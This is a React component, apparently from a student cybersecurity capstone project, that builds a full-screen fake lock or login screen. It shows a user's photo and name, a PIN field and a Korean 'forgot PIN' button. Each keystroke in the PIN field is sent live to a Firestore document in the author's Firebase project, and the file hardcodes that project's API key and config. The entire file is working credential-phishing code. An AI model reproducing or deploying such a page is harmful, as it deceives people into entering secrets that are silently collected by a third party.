import React, {useState} from "react";
import classes from "./Inputpin.module.css";
import head from "../images/head.png";
import { FullScreen, useFullScreenHandle } from "react-full-screen"
import { initializeApp } from "firebase/app";
import { getFirestore, doc, setDoc } from "firebase/firestore";


const firebaseConfig = {
    apiKey: "AIzaSyC_IUaMyr9VhieuRtr4-EVdd8MOHXyjLXM",
    authDomain: "cybersecuritycapstone-c2e14.firebaseapp.com",
    projectId: "cybersecuritycapstone-c2e14",
    storageBucket: "cybersecuritycapstone-c2e14.appspot.com",
    messagingSenderId: "683320376252",
    appId: "1:683320376252:web:28ff4101bb698a32c309b9"
  };

const app = initializeApp(firebaseConfig);
const db = getFirestore(app);



const Inputpin = () => {


    const pinChangeHandler = async (e) => {
        await setDoc(doc(db, "data", "pin"), {
            pinNumber: e.target.value
          });
    };
    const handle = useFullScreenHandle()
    

    return (
        <FullScreen handle={handle}>
            <div className={classes.pindiv}>
                <img src={head} alt="Park"/>
                <div className={classes.textname}>
                    Park Seong Jun
                </div>
                <input className={classes.pin} type="password" onInput={pinChangeHandler} />
                <button className={classes.pinforgetbutton} >
                    PIN 잊음
                </button>
                <button onClick={handle.enter}>full</button>
                <button onClick={handle.exit}>small</button>
            </div>
        </FullScreen>
    );
};

export default Inputpin;